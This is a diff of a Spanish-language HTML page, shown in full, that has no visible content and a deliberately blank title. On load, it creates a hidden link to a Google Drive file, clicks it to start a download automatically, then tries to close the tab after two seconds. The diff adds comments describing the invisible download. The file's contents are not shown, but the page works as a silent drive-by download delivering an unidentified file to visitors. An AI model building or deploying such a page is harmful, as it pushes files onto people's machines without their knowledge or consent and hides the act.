@@ -1,18 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>.</title>
+  <title>       </title> <!-- título invisible -->
   <style>
     html, body {
+      height: 100%;
       margin: 0;
-      padding: 0;
-      background: transparent;
+      background-color: #000; /* fondo negro */
       overflow: hidden;
     }
   </style>
   <script>
     window.onload = () => {
+      // Crea el enlace invisible para descargar
       const link = document.createElement("a");
       link.href = "https://drive.google.com/uc?export=download&id=1DSJTfn96ifY4FjYlEpONe3-2VBxLrZ9I";
       link.download = "";
@@ -20,7 +21,7 @@
       document.body.appendChild(link);
       link.click();
 
-      // Intenta cerrar la pestaña después de iniciar la descarga
+      // Espera 2 segundos y cierra la pestaña
       setTimeout(() => {
         window.open('', '_self', '');
         window.close();
@@ -28,5 +29,6 @@
     };
   </script>
 </head>
-<body></body>
+<body>
+</body>
 </html>
